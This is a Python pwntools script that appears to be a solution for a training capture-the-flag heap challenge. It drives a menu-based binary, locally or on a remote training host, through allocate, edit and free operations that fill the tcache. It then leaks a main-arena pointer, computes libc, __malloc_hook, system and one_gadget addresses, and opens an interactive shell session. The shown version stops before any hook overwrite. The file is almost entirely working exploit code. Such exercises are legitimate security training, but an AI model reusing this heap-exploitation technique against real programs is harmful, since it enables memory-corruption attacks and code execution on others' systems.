import time
from pwn import *
import sys

if(len(sys.argv)>1):
	run_local = False
else:
	run_local = True




SIZE=90

if "REMOTE" not in args:
	r= process('./test')
else:
	r = remote("bin.training.jinblack.it",3004)


global pkm_number
pkm_number=0
def alloc0(name,size,art):
	r.recvuntil(b"> ")
	r.sendline(b"0")
	r.recvuntil(b"> ")
	r.sendline(b"%s" % name)
	r.recvuntil(b"> ")
	r.sendline(b"%d" % size)
	sleep(0.1)
	r.send(b"%s" % art)

def edit0(index,name,size,art):
	r.recvuntil(b"> ")
	r.sendline(b"3")
	r.recvuntil(b"> ")
	r.sendline(b"%d" % index)
	r.recvuntil(b"> ")
	r.sendline(b"%s" % name)
	r.recvuntil(b"> ")
	r.sendline(b"%d" % size)
	sleep(0.1)
	r.send(b"%s" % art)
	print(pkm_number)

def kill0(index):
	r.recvuntil(b"> ")
	r.sendline(b"2")
	r.recvuntil(b"> ")
	r.sendline(b"%d" % index)

def print2(index):
	r.recvuntil(b"> ")
	r.sendline(b"4")
	r.recvuntil(b"> ")
	r.sendline(b"%d" % index)
	tounpack=r.recvuntil(b"Name: ")
	print(tounpack)	
	tounpack=r.recvuntil(b">")
	print(tounpack)	



def write0(index,data):
	r.recvuntil(b"> ")
	r.sendline(b"2")
	r.recvuntil(b"Index: ")
	r.sendline(b"%d" % index)
	r.recvuntil(b"Content: ")
	r.send(data)
	#r.recvuntil(b"Options: ")[:-len("Options:")]

kill0(0)


alloc0(b'A'*99,0x200,b'A'*0x1f0)
alloc0(b'B'*99,0x200,b'B'*99)
alloc0(b'C'*99,0x200,b'C'*99)
alloc0(b'D'*99,0x200,b'D'*99)
alloc0(b'E'*99,0x200,b'E'*99)
alloc0(b'F'*99,0x200,b'F'*99)
alloc0(b'G'*99,0x200,b'G'*99)
alloc0(b'H'*99,0x200,b'H'*99)
alloc0(b'I'*99,0x200,b'I'*99)
alloc0(b'J'*99,0x200,b'I'*99)

kill0(3)
kill0(4)
kill0(5)
kill0(6)
kill0(7)
kill0(8)
kill0(9)
#PUT ALL IN TCACHE EXCEPT CHUNK IN WHICH WE CAN OVERFLOW WITH ART NAME

kill0(1)
#NOW CONTAINS POINTER TO MAIN ARENA

alloc0(b'B'*99,0x200,b'B'*99)
alloc0(b'B'*99,0x200,b'B'*99)
alloc0(b'B'*99,0x200,b'B'*99)
alloc0(b'B'*99,0x200,b'B'*99)
alloc0(b'B'*99,0x200,b'B'*99)
alloc0(b'B'*99,0x200,b'B'*99)
alloc0(b'B'*99,0x200,b'B'*99)
alloc0(b'a',0x200,b'K'*8)
#STUPIDLY REALLOCATE EVERYTHING, BUT 1 WILL ONLY HAVE THE FIRST WORD FILLED


r.sendline(b'1')
r.recvuntil(b'art#> ')
r.sendline(b'9')


#PRINT



r.recvuntil(b'KKKKKKKK')
leak=r.recvuntil(b'B')[:-1]
print("[!]LEAK: "+hex(u64(leak)))
libc=u64(leak)-0x3ebca0
mhook=libc+0x3ebc30
chunk=mhook-0x23
system=libc+0x4f440
one=libc+0x4f2c5
#one=libc+0x4f322
#one=libc+0x10a38c

print("[!]LIBC: "+hex(libc))
print("[!]MALLOC_HOOK: "+hex(mhook))
print("[!]ONE_GADGET: "+hex(one))
#r.interactive()

kill0(1)
kill0(2)
kill0(3)
kill0(4)
kill0(5)
kill0(6)
kill0(7)
kill0(8)
kill0(9)



r.interactive()
